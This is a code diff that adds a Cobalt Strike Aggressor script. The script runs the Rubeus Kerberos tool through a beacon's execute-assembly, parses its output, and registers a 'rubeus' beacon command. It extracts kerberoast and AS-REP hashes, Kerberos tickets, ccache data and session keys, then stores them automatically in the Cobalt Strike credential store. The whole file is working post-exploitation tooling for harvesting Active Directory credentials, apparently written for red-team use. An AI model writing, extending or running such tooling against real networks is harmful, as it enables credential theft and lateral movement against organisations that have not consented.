+    @parts = split("\\$", $tail);
+    if (size(@parts) < 4) {
+        return %();
+    }
+
+    $user = @parts[1];
+    $realm = @parts[2];
+    $service = @parts[3];
+
+    if (__rubeus_starts_with($user, "*")) {
+        $user = substr($user, 1);
+    }
+    if (strlen($service) > 0 && charAt($service, strlen($service) - 1) eq "*") {
+        $service = substr($service, 0, strlen($service) - 1);
+    }
+
+    return %(username => $user, realm => $realm, service => $service);
+}
+
+sub __rubeus_entry_username {
+    local('%entry $hash $prefix_len $tail $idx %tgs');
+    %entry = $1;
+
+    if (%entry["username"] !is $null && %entry["username"] ne "") {
+        return %entry["username"];
+    }
+    if (%entry["samaccountname"] !is $null && %entry["samaccountname"] ne "") {
+        return %entry["samaccountname"];
+    }
+    if (%entry["userprincipalname"] !is $null && %entry["userprincipalname"] ne "") {
+        return %entry["userprincipalname"];
+    }
+    if (%entry["clientname"] !is $null && %entry["clientname"] ne "") {
+        return %entry["clientname"];
+    }
+    if (%entry["user"] !is $null && %entry["user"] ne "") {
+        return %entry["user"];
+    }
+    if (%entry["hash"] !is $null && __rubeus_starts_with(%entry["hash"], "\$krb5tgs\$") == 1) {
+        %tgs = __rubeus_parse_tgs_hash(%entry["hash"]);
+        if (%tgs["username"] !is $null && %tgs["username"] ne "") {
+            return %tgs["username"];
+        }
+    }
+    if (%entry["hash"] !is $null && __rubeus_starts_with(%entry["hash"], "\$krb5asrep\$") == 1) {
+        $hash = %entry["hash"];
+        $prefix_len = strlen("\$krb5asrep\$23\$");
+        if (strlen($hash) > $prefix_len) {
+            $tail = substr($hash, $prefix_len);
+            $idx = [[new String: ("" . $tail)] indexOf: "@"];
+            if ($idx > 0) {
+                return substr($tail, 0, $idx);
+            }
+        }
+    }
+
+    return "";
+}
+
+sub __rubeus_entry_realm {
+    local('%entry $hash $prefix_len $tail $start_idx $end_idx %tgs');
+    %entry = $1;
+
+    if (%entry["userrealm"] !is $null && %entry["userrealm"] ne "") {
+        return %entry["userrealm"];
+    }
+    if (%entry["servicerealm"] !is $null && %entry["servicerealm"] ne "") {
+        return %entry["servicerealm"];
+    }
+    if (%entry["domainname"] !is $null && %entry["domainname"] ne "") {
+        return %entry["domainname"];
+    }
+    if (%entry["targetdomainname"] !is $null && %entry["targetdomainname"] ne "") {
+        return %entry["targetdomainname"];
+    }
+    if (%entry["hash"] !is $null && __rubeus_starts_with(%entry["hash"], "\$krb5tgs\$") == 1) {
+        %tgs = __rubeus_parse_tgs_hash(%entry["hash"]);
+        if (%tgs["realm"] !is $null && %tgs["realm"] ne "") {
+            return %tgs["realm"];
+        }
+    }
+    if (%entry["hash"] !is $null && __rubeus_starts_with(%entry["hash"], "\$krb5asrep\$") == 1) {
+        $hash = %entry["hash"];
+        $prefix_len = strlen("\$krb5asrep\$23\$");
+        if (strlen($hash) > $prefix_len) {
+            $tail = substr($hash, $prefix_len);
+            $start_idx = [[new String: ("" . $tail)] indexOf: "@"];
+            $end_idx = [[new String: ("" . $tail)] indexOf: ":"];
+            if ($start_idx > 0 && $end_idx > $start_idx) {
+                return substr($tail, $start_idx + 1, $end_idx);
+            }
+        }
+    }
+
+    return "";
+}
+
+sub __rubeus_entry_service_reference {
+    local('%entry %tgs');
+    %entry = $1;
+
+    if (%entry["serviceprincipalname"] !is $null && %entry["serviceprincipalname"] ne "") {
+        return %entry["serviceprincipalname"];
+    }
+    if (%entry["servicename"] !is $null && %entry["servicename"] ne "") {
+        return %entry["servicename"];
+    }
+    if (%entry["targetname"] !is $null && %entry["targetname"] ne "") {
+        return %entry["targetname"];
+    }
+    if (%entry["hash"] !is $null && __rubeus_starts_with(%entry["hash"], "\$krb5tgs\$") == 1) {
+        %tgs = __rubeus_parse_tgs_hash(%entry["hash"]);
+        if (%tgs["service"] !is $null && %tgs["service"] ne "") {
+            return %tgs["service"];
+        }
+    }
+
+    return "";
+}
+
+sub __rubeus_empty_if_null {
+    if ($1 is $null) {
+        return "";
+    }
+
+    return "" . $1;
+}
+
+sub __rubeus_credential_exists {
+    local('$username $secret $realm $source $host $cred');
+    ($username, $secret, $realm, $source, $host) = @_;
+
+    foreach $cred (credentials()) {
+        if (__rubeus_empty_if_null($cred["user"]) eq $username &&
+            __rubeus_empty_if_null($cred["password"]) eq $secret &&
+            __rubeus_empty_if_null($cred["realm"]) eq $realm &&
+            __rubeus_empty_if_null($cred["source"]) eq $source &&
+            __rubeus_empty_if_null($cred["host"]) eq $host) {
+            return 1;
+        }
+    }
+
+    return 0;
+}
+
+sub __rubeus_credential_type {
+    local('$kind');
+    $kind = $1;
+
+    if ($kind eq "password") {
+        return "password";
+    }
+    if (($kind eq "hash") || ($kind eq "kerberoast_hash")) {
+        return "hash";
+    }
+    if (($kind eq "kirbi") || ($kind eq "ccache")) {
+        return "ticket";
+    }
+    return $kind;
+}
+
+sub __rubeus_credential_source {
+    local('$bid $hostname $pid');
+    $bid = $1;
+
+    $hostname = beacon_info($bid, "computer");
+    $pid = beacon_info($bid, "pid");
+
+    if ($hostname is $null || $hostname eq "") {
+        $hostname = "unknown-host";
+    }
+    if ($pid is $null || $pid eq "") {
+        $pid = "unknown-pid";
+    }
+
+    return "Rubeus@" . $hostname . ":" . $pid;
+}
+
+sub __rubeus_append_note_field {
+    local('$notes $label $value');
+    ($notes, $label, $value) = @_;
+
+    if ($value !is $null && $value ne "") {
+        return $notes . "; " . $label . "=" . $value;
+    }
+
+    return $notes;
+}
+
+sub __rubeus_ticket_notes {
+    local('%entry $notes');
+    (%entry, $notes) = @_;
+
+    $notes = __rubeus_append_note_field($notes, "key_type", %entry["keytype"]);
+    $notes = __rubeus_append_note_field($notes, "session_key_type", %entry["sessionkeytype"]);
+    $notes = __rubeus_append_note_field($notes, "base64_key", %entry["base64_key"]);
+    $notes = __rubeus_append_note_field($notes, "base64_session_key", %entry["base64sessionkey"]);
+    $notes = __rubeus_append_note_field($notes, "start_time", %entry["starttime"]);
+    $notes = __rubeus_append_note_field($notes, "end_time", %entry["endtime"]);
+    $notes = __rubeus_append_note_field($notes, "renew_till", %entry["renewtill"]);
+    $notes = __rubeus_append_note_field($notes, "renew_until", %entry["renewuntil"]);
+    $notes = __rubeus_append_note_field($notes, "flags", %entry["flags"]);
+    $notes = __rubeus_append_note_field($notes, "ticket_flags", %entry["ticketflags"]);
+
+    return $notes;
+}
+
+sub __rubeus_record_credential {
+    local('$bid %state %entry $secret $kind $command $username $realm $host $source $type $notes $service_reference $cred_key $add_error');
+    ($bid, %state, %entry, $secret, $kind, $command) = @_;
+
+    if ($secret is $null || $secret eq "") {
+        return %state;
+    }
+
+    $username = __rubeus_entry_username(%entry);
+    if ($username eq "") {
+        blog($bid, "[rubeus_parser] Parsed " . $kind . " material, but no username was found; skipping credential_add.");
+        return %state;
+    }
+
+    $realm = __rubeus_entry_realm(%entry);
+    $host = "";
+    $source = __rubeus_credential_source($bid);
+    $type = __rubeus_credential_type($kind);
+    $service_reference = __rubeus_entry_service_reference(%entry);
+    $notes = "tool=rubeus; material=" . $kind . "; command=" . $command;
+    if ($realm ne "") {
+        $notes = $notes . "; realm=" . $realm;
+    }
+    if ($service_reference ne "") {
+        $notes = $notes . "; service=" . $service_reference;
+    }
+    if (($kind eq "kirbi") || ($kind eq "ccache")) {
+        $notes = __rubeus_ticket_notes(%entry, $notes);
+    }
+    $cred_key = $username . "\u0001" . $secret . "\u0001" . $realm . "\u0001" . $host . "\u0001" . $source . "\u0001" . $type;
+
+    if (%state["emitted_credentials"][$cred_key] !is $null) {
+        return %state;
+    }
+
+    $add_error = "";
+    try {
+        credential_add($username, $secret, $realm, $source, $host, $type, $notes);
+    }
+    catch $ex {
+        $add_error = "" . $ex;
+    }
+
+    if ($add_error ne "") {
+        blog($bid, "[rubeus_parser] credential_add with notes failed for " . $username . iff($realm ne "", "@" . $realm, "") . " [" . $kind . "]: " . $add_error);
+        return %state;
+    }
+
+    blog($bid, "[rubeus_parser] Added credential to store: " . $username . iff($realm ne "", "@" . $realm, "") . " [" . $kind . "]");
+    %state["emitted_credentials"][$cred_key] = 1;
+    return %state;
+}
+
+sub __rubeus_publish_credentials {
+    local('$bid %state %output %entry $command');
+    ($bid, %state, %output) = @_;
+    $command = %output["command"];
+
+    foreach %entry (%output["entries"]) {
+        if (%entry["password"] !is $null && %entry["password"] ne "") {
+            %state = __rubeus_record_credential($bid, %state, %entry, %entry["password"], "password", $command);
+        }
+        if (%entry["hash"] !is $null && %entry["hash"] ne "") {
+            %state = __rubeus_record_credential($bid, %state, %entry, %entry["hash"], "hash", $command);
+        }
+        if (%entry["kerberoast_hash"] !is $null && %entry["kerberoast_hash"] ne "") {
+            %state = __rubeus_record_credential($bid, %state, %entry, %entry["kerberoast_hash"], "kerberoast_hash", $command);
+        }
+        if (%entry["base64encodedticket"] !is $null && %entry["base64encodedticket"] ne "") {
+            %state = __rubeus_record_credential($bid, %state, %entry, %entry["base64encodedticket"], "kirbi", $command);
+        }
+        if (%entry["ccache"] !is $null && %entry["ccache"] ne "") {
+            %state = __rubeus_record_credential($bid, %state, %entry, %entry["ccache"], "ccache", $command);
+        }
+    }
+
+    return %state;
+}
+
+sub __rubeus_has_credential_material {
+    local('%output %entry');
+    %output = $1;
+
+    foreach %entry (%output["entries"]) {
+        if ((%entry["password"] !is $null && %entry["password"] ne "") ||
+            (%entry["hash"] !is $null && %entry["hash"] ne "") ||
+            (%entry["kerberoast_hash"] !is $null && %entry["kerberoast_hash"] ne "") ||
+            (%entry["base64encodedticket"] !is $null && %entry["base64encodedticket"] ne "") ||
+            (%entry["base64_key"] !is $null && %entry["base64_key"] ne "") ||
+            (%entry["ccache"] !is $null && %entry["ccache"] ne "")) {
+            return 1;
+        }
+    }
+
+    return 0;
+}
+
+sub __rubeus_contains_text {
+    local('$text $needle');
+    ($text, $needle) = @_;
+    $text = [[new String: ("" . $text)] toLowerCase];
+    $needle = [[new String: ("" . $needle)] toLowerCase];
+    return iff([[new String: ("" . $text)] indexOf: $needle] >= 0, 1, 0);
+}
+
+sub __rubeus_show_triage_table {
+    local('$bid %state %output @rows $signature $tableID $tabName @columnNames @columnWidths %callbackHints');
+    ($bid, %state, %output) = @_;
+
+    if (__rubeus_command_name(%output["command"]) ne "triage" || %output["triage"] is $null) {
+        return %state;
+    }
+
+    @rows = %output["triage"];
+    if (size(@rows) == 0) {
+        return %state;
+    }
+
+    $signature = __rubeus_to_json(@rows);
+    if ($signature eq %state["triage_table_signature"]) {
+        return %state;
+    }
+
+    $tableID = "RubeusTriageTable";
+    $tabName = "Rubeus Triage";
+    @columnNames = @("LUID", "UserName", "Service", "EndTime");
+    @columnWidths = @(120, 280, 360, 190);
+
+    if (__rubeus_try_open_user_defined_browser($tableID, $tabName, @columnNames, @rows, @columnWidths, %callbackHints) == 1) {
+        %state["triage_table_signature"] = $signature;
+    }
+    else if (%state["user_defined_browser_warning_logged"] == 0) {
+        blog($bid, "[rubeus_parser] This Cobalt Strike version does not support openUserDefinedBrowser; skipping the Rubeus Triage table.");
+        %state["user_defined_browser_warning_logged"] = 1;
+    }
+    return %state;
+}
+
+################### CALLBACKS AND PUBLIC API ###################
+
+sub __rubeus_parser_callback {
+    local('$bid $result %state %output $signature');
+    $bid = $1;
+    $result = $2;
+    %state = %rubeus_parser_state[$bid];
+
+    if ($result is $null || __rubeus_trim($result) eq "") {
+        return;
+    }
+
+    if (%state is $null) {
+        %state = __rubeus_new_state();
+    }
+
+    if (%state["raw_output"] eq "") {
+        %state["raw_output"] = "" . $result;
+    }
+    else {
+        %state["raw_output"] = %state["raw_output"] . "\n" . $result;
+    }
+
+    %output = __rubeus_parse_output(%state["raw_output"], %state["command"]);
+    %state["parsed_output"] = %output;
+    %state = __rubeus_publish_credentials($bid, %state, %output);
+    %state = __rubeus_show_triage_table($bid, %state, %output);
+    $signature = __rubeus_to_json(%output);
+
+    if (%state["outfile_requested"] == 1 &&
+        %state["outfile_warning_logged"] == 0 &&
+        __rubeus_has_credential_material(%output) == 0 &&
+        (__rubeus_contains_text(%state["raw_output"], "hash written to") == 1 || __rubeus_contains_text(%state["raw_output"], "roasted hashes written to") == 1)) {
+        blog($bid, "[rubeus_parser] No credential was added because /outfile kept the roast hash out of stdout. Run without /outfile so the parser can capture and store the hash.");
+        %state["outfile_warning_logged"] = 1;
+    }
+
+    if (%state["parser_logged"] == 0) {
+        blog($bid, "[rubeus_parser] Parsing plain-text Rubeus output.");
+        %state["parser_logged"] = 1;
+    }
+
+    if ($signature ne %state["emitted_signature"]) {
+        %state["emitted_signature"] = $signature;
+
+        if (%state["debug_json"] == 1) {
+            blog($bid, "[rubeus_parser] Parsed Rubeus output (JSON):");
+            blog($bid, "[rubeus_parser][json] " . $signature);
+        }
+    }
+
+    if (%state["debug_json"] == 0) {
+        __rubeus_log_result_text($bid, $result);
+    }
+
+    %rubeus_parser_state[$bid] = %state;
+}
+
+sub rubeus_parser_result {
+    local('$bid %state');
+    $bid = $1;
+    %state = %rubeus_parser_state[$bid];
+
+    if (%state is $null) {
+        return %();
+    }
+
+    if (%state["parsed_output"] is $null) {
+        return %();
+    }
+
+    return %state["parsed_output"];
+}
+
+sub rubeus_parse_text {
+    local('$text $command');
+    ($text, $command) = @_;
+    return __rubeus_parse_output($text, $command);
+}
+
+sub run_rubeus_parser {
+    local('$bid @raw_args @filtered_args $arg $arguments %state $debug_json $outfile_requested $rubeus_exec_path');
+    $bid = $1;
+
+    if (size(@_) >= 2 && $2 !is $null && $2 ne "") {
+        $arguments = __rubeus_trim($2);
+    }
+    else {
+        @raw_args = sublist(@_, 1);
+
+        foreach $arg (@raw_args) {
+            if ($arg !is $null && $arg ne "") {
+                push(@filtered_args, $arg);
+            }
+        }
+
+        $arguments = join(" ", @filtered_args);
+    }
+
+    if ($rubeus_path eq "" || $rubeus_path is $null) {
+        berror($bid, "Set \$rubeus_path in config/local.cna to your local Rubeus.exe path first.");
+        return;
+    }
+    if (__rubeus_path_exists($rubeus_path) == 0) {
+        berror($bid, "Configured \$rubeus_path does not exist or is not a file: " . $rubeus_path . " (resolved: " . __rubeus_resolved_path($rubeus_path) . ")");
+        return;
+    }
+    $rubeus_exec_path = __rubeus_resolved_path($rubeus_path);
+    if ($arguments eq "") {
+        berror($bid, "Use: rubeus [arguments]\nExample: rubeus kerberoast");
+        return;
+    }
+
+    $debug_json = __rubeus_contains_flag($arguments, "/json");
+    $outfile_requested = __rubeus_contains_option_prefix($arguments, "/outfile");
+    $arguments = __rubeus_strip_flag($arguments, "/nojson");
+    $arguments = __rubeus_strip_flag($arguments, "/json");
+    $arguments = __rubeus_trim($arguments);
+
+    if (__rubeus_should_add_nowrap($arguments) == 1 && __rubeus_contains_nowrap($arguments) == 0) {
+        $arguments = __rubeus_trim($arguments . " /nowrap");
+    }
+
+    %state = __rubeus_new_state();
+    %state["command"] = $arguments;
+    %state["debug_json"] = $debug_json;
+    %state["outfile_requested"] = $outfile_requested;
+    %rubeus_parser_state[$bid] = %state;
+
+    btask($bid, "Running Rubeus with native bexecute_assembly and parsing Rubeus output", "T1055");
+    bexecute_assembly($bid, $rubeus_exec_path, $arguments, $null, &__rubeus_parser_callback);
+}
+
+################### REGISTRATION ###################
+
+alias rubeus {
+    local('$arguments');
+    $arguments = __rubeus_trim(substr($0, strlen("rubeus")));
+    run_rubeus_parser($1, $arguments);
+}
+
+beacon_command_register(
+"rubeus",
+"Run Rubeus with native execute-assembly and parse structured output",
+"Use: rubeus [arguments]\n\nOutput mode flags: /json prints parsed JSON, while /nojson keeps the original Rubeus output. /nojson is the default.\n\nThe parsed Sleep object is also stored per beacon and can be retrieved with rubeus_parser_result(\$bid). You can also parse captured text directly with rubeus_parse_text(\$text, \$command).\n\nUpdate \$rubeus_path in config/local.cna so it points to your local Rubeus.exe. Example: rubeus kerberoast /json");
